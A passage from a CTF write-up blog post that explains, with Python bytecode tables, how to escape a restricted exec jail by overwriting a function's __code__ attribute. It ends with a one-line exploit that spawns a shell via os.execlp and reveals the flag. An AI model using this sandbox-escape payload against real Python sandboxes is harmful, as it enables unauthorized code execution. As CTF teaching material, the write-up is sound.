+<a class="sourceLine" id="cb28-5" title="5">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">2</span>, argval<span class="op">=</span><span class="st">&#39;&lt;lambda&gt;&#39;</span>, argrepr<span class="op">=</span><span class="st">&quot;&#39;&lt;lambda&gt;&#39;&quot;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-6" title="6">Instruction(opname<span class="op">=</span><span class="st">&#39;MAKE_FUNCTION&#39;</span>, opcode<span class="op">=</span><span class="dv">132</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">0</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-7" title="7">Instruction(opname<span class="op">=</span><span class="st">&#39;ROT_TWO&#39;</span>, opcode<span class="op">=</span><span class="dv">2</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">8</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-8" title="8">Instruction(opname<span class="op">=</span><span class="st">&#39;STORE_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">90</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">10</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-9" title="9">Instruction(opname<span class="op">=</span><span class="st">&#39;STORE_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">90</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;y&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;y&#39;</span>, offset<span class="op">=</span><span class="dv">12</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-10" title="10">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">3</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;None&#39;</span>, offset<span class="op">=</span><span class="dv">14</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb28-11" title="11">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">16</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>We can tabulate what happens when each instruction is executed. The parentheses indicate what constant from <code>co_consts</code> or name from <code>co_names</code> are referenced by the argument. The stack is listed from bottom to top.</p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Instruction</th>
+<th>Effect</th>
+<th>Stack</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>LOAD_CONST 0 (0)</td>
+<td>Push 0 onto stack</td>
+<td>0</td>
+</tr>
+<tr class="even">
+<td>LOAD_CONST 1 (code object)</td>
+<td>Push code object</td>
+<td>0, code object</td>
+</tr>
+<tr class="odd">
+<td>LOAD_CONST 2 (<code>"&lt;lambda&gt;"</code>)</td>
+<td>Push string <code>"&lt;lambda&gt;"</code></td>
+<td>0, code object, <code>"&lt;lambda&gt;"</code></td>
+</tr>
+<tr class="even">
+<td>MAKE_FUNCTION</td>
+<td>Pop code object and name; push lambda function</td>
+<td>0, lambda</td>
+</tr>
+<tr class="odd">
+<td>ROT_TWO</td>
+<td>Swap 0 and lambda on stack</td>
+<td>lambda, 0</td>
+</tr>
+<tr class="even">
+<td>STORE_NAME 0 (x)</td>
+<td>Put 0 into <code>x</code></td>
+<td>lambda</td>
+</tr>
+<tr class="odd">
+<td>STORE_NAME 1 (y)</td>
+<td>Put lambda into <code>y</code></td>
+<td>(empty)</td>
+</tr>
+<tr class="even">
+<td>LOAD_CONST 3 (None)</td>
+<td>Push None onto stack</td>
+<td>None</td>
+</tr>
+<tr class="odd">
+<td>RETURN_VALUE</td>
+<td>Return None from this code</td>
+<td>(empty)</td>
+</tr>
+</tbody>
+</table>
+<p>Two asides here:</p>
+<ol type="1">
+<li>Why does this stack juggling occur? Why doesn’t Python just do one of pushing/constructing the values and storing them into <code>x</code> and <code>y</code> in the opposite order? I didn’t investigate this in detail, but my guess is that it’s necessary in general to keep the execution order of expressions and assignments as all left-to-right as one might expect. It also sort of motivates why the same evaluation order of subexpressions is <a href="https://en.cppreference.com/w/cpp/language/eval_order">deliberately unspecified</a> in C/C++ and similar languages.</li>
+<li>Also note that the fact that all this code compiles to pushing two things onto the stack and then directly popping them into two variables is not actually that intuitive if you think about it more. An expression like <code>a, b = x, y</code> is “supposed to” make a tuple <code>(x, y)</code> and then unpack the tuple into the variables <code>a</code> and <code>b</code>, since an assignment like <code>a = x, y</code> works and puts a tuple into <code>a</code>. If you disassemble <code>a = x, y</code>, you’ll see a <code>BUILD_TUPLE</code> instruction; conversely, if you disassemble <code>a, b = x</code>, you’ll see an <code>UNPACK_SEQUENCE</code> instruction. Fortunately for my code, Python optimized out the tuple packing and unpacking, just like it optimized out <code>1 + 2 = 3</code> in the first example we looked at.</li>
+</ol>
+<p>If we delete the <code>MAKE_FUNCTION</code> instruction and let the rest of the opcodes do what they do, the effects become:</p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Instruction</th>
+<th>Effect</th>
+<th>Stack</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>LOAD_CONST 0 (0)</td>
+<td>Push 0 onto stack</td>
+<td>0</td>
+</tr>
+<tr class="even">
+<td>LOAD_CONST 1 (code object)</td>
+<td>Push code object</td>
+<td>0, code object</td>
+</tr>
+<tr class="odd">
+<td>LOAD_CONST 2 (<code>"&lt;lambda&gt;"</code>)</td>
+<td>Push string <code>"&lt;lambda&gt;"</code></td>
+<td>0, code object, <code>"&lt;lambda&gt;"</code></td>
+</tr>
+<tr class="even">
+<td>ROT_TWO</td>
+<td>Swap code object and lambda on stack</td>
+<td>0, <code>"&lt;lambda&gt;"</code>, code object</td>
+</tr>
+<tr class="odd">
+<td>STORE_NAME 0 (x)</td>
+<td>Put code object into <code>x</code></td>
+<td>0, <code>"&lt;lambda&gt;"</code></td>
+</tr>
+<tr class="even">
+<td>STORE_NAME 1 (y)</td>
+<td>Put <code>"&lt;lambda&gt;"</code> into <code>y</code></td>
+<td>0</td>
+</tr>
+<tr class="odd">
+<td>LOAD_CONST 3 (None)</td>
+<td>Push None onto stack</td>
+<td>0, None</td>
+</tr>
+<tr class="even">
+<td>RETURN_VALUE</td>
+<td>Return None from this code</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p>In any case, we now know how to get a code object of our design into a variable. Unfortunately, but unsurprisingly, we can’t directly call code objects as if they’re functions. If we try</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb29-1" title="1">gift.f, x <span class="op">=</span> <span class="dv">0</span>, <span class="kw">lambda</span>: ()<span class="op">;</span> gift.f()</a></code></pre></div>
+<p>we get this error:</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb30-1" title="1">Traceback (most recent call last):</a>
+<a class="sourceLine" id="cb30-2" title="2">  File <span class="st">&quot;/app/run&quot;</span>, line <span class="dv">39</span>, <span class="kw">in</span> <span class="op">&lt;</span>module<span class="op">&gt;</span></a>
+<a class="sourceLine" id="cb30-3" title="3">    <span class="bu">exec</span>(code, {<span class="st">&quot;__builtins__&quot;</span>: {<span class="st">&quot;gift&quot;</span>: gift}}, v)</a>
+<a class="sourceLine" id="cb30-4" title="4">  File <span class="st">&quot;&lt;math&gt;&quot;</span>, line <span class="dv">1</span>, <span class="kw">in</span> <span class="op">&lt;</span>module<span class="op">&gt;</span></a>
+<a class="sourceLine" id="cb30-5" title="5"><span class="pp">TypeError</span>: <span class="st">&#39;code&#39;</span> <span class="bu">object</span> <span class="kw">is</span> <span class="kw">not</span> <span class="bu">callable</span></a></code></pre></div>
+<p>If you want a code object to run, you can’t run it directly; you have to call a function that has a code object inside it. Can we make that happen? Wait, how exactly is the code object run by a function associated with it?</p>
+<p>We can discover this (yet again) the <a href="https://docs.python.org/3/library/inspect.html"><code>inspect</code> module</a> docs, or (yet again) <a href="https://stackoverflow.com/a/5768692">StackOverflow</a>:</p>
+<blockquote>
+<p>functions have the function attribute <code>__code__</code> (also known as <code>func_code</code> in older versions) from which you can obtain the function’s code object</p>
+</blockquote>
+<p>The million-dollar question now is: is this attribute writable? Let’s run a trivial example to check:</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb31-1" title="1"><span class="op">&gt;&gt;&gt;</span> f <span class="op">=</span> <span class="kw">lambda</span>: <span class="dv">1</span></a>
+<a class="sourceLine" id="cb31-2" title="2"><span class="op">&gt;&gt;&gt;</span> g <span class="op">=</span> <span class="kw">lambda</span>: <span class="dv">2</span></a>
+<a class="sourceLine" id="cb31-3" title="3"><span class="op">&gt;&gt;&gt;</span> f.__code__ <span class="op">=</span> g.__code__</a>
+<a class="sourceLine" id="cb31-4" title="4"><span class="op">&gt;&gt;&gt;</span> f()</a>
+<a class="sourceLine" id="cb31-5" title="5"><span class="dv">2</span></a></code></pre></div>
+<p>It is, which means we do have a way to get our custom, exploit-containing code object to execute. If we set the <code>__code__</code> attribute of an existing function to our code object, and then call that function, we can get our code object to run! And it turns out that <code>gift</code> is both an exiting object and the exact tool we need to set a <code>__code__</code> attribute.</p>
+<h3 id="the-final-exploit">The final exploit</h3>
+<p>The exploit is even easier than I expected at first: it’s possible to call built-ins in the body of the lambda/code object we’re making, so we can just <code>__import__</code> what we want instead of having to hunt for a subclass of <code>object</code>. This makes sense because we’re sort of replacing the code in the body of <code>gift</code> with our own code and then running it, and it makes sense that we would be able to call <code>__import__</code> from the body of <code>gift</code>, which doesn’t execute in the “jail”. So we can just get the flag with an exploit like:</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb32-1" title="1">gift.f <span class="op">=</span> gift<span class="op">;</span> b,c <span class="op">=</span> <span class="dv">0</span>,<span class="kw">lambda</span>: <span class="bu">__import__</span>(<span class="st">&quot;os&quot;</span>).execlp(<span class="st">&quot;sh&quot;</span>,<span class="st">&quot;sh&quot;</span>)<span class="op">;</span> gift.f(gift, <span class="st">&quot;__code__&quot;</span>, b)<span class="op">;</span> gift.f()</a></code></pre></div>
+<p>This pops a shell, so we <code>cd ..</code> and <code>cat flag*</code> and we’re done!</p>
+<pre><code>dice{i_sh0uldve_upgr4ded_to_th3_color_edit10n}</code></pre>
+<section class="footnotes">
+<hr />
+<ol>
+<li id="fn1"><p>The team is called Organizers; they are not the (lowercase-o) organizers of DiceCTF.<a href="#fnref1" class="footnote-back">↩</a></p></li>
+</ol>
+</section></article>
+	<footer class="post-footer">
+		
+		<ul class="post-tags">
+			
+			<li><a href="/tag/ctf"><span class="tag">CTF</span></a></li>
+			
+		</ul>
+		
+	</footer>
+	<script data-isso="//node.vero.site/isso/" data-isso-css="false" src="//node.vero.site/isso/js/embed.min.js"></script>
+	<section id="isso-thread"></section>
+	<p class="comments-meta">(note: the commenting setup here is experimental and I may not check my comments often; if you want to tell <em>me</em> something instead of the world, email me!)</p>
+	
+	
+	
+	<footer class="post-footer">
+		<nav class="pagination">
+			
+			<a class="pagination-previous" href="//blog.vero.site/post/blazingfast">← blazingfast</a>
+			
+			
+		</nav>
+	</footer>
+</section>
+<footer class="site-footer">
+	<p>© 2017-2022 betaveros, Bounded-Error Log</p>
+	<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />Except where otherwise noted, content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+	<p>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="http://pandoc.org/">pandoc</a>,
+	<a href="https://www.goatcounter.com/">GoatCounter</a>,
+	<a href="https://posativ.org/isso/">Isso</a>,
+	<a href="https://pages.github.com/">GitHub Pages</a>, and
+	<a href="https://www.cloudflare.com/">CloudFlare</a>.
+	</p>
+	<p>Opinions are mine and not of any employer, past or present.</p>
+</footer>
+
+<script src="/katex/katex.min.js"></script>
+<script src="/katex/contrib/auto-render.min.js"></script>
+<script>renderMathInElement(document.body);</script>
+<script src="/js/bundle.js"></script>
+<script>window.goatcounter = { path: function(p) { return '/blog' + p; } }</script>
+<script data-goatcounter="https://node.vero.site:8073/count" async src="https://node.vero.site:8073/count.js"></script>
+<script src="/js/jquery-3.2.1.min.js"></script>
+
+
+</div></body>
+</html>
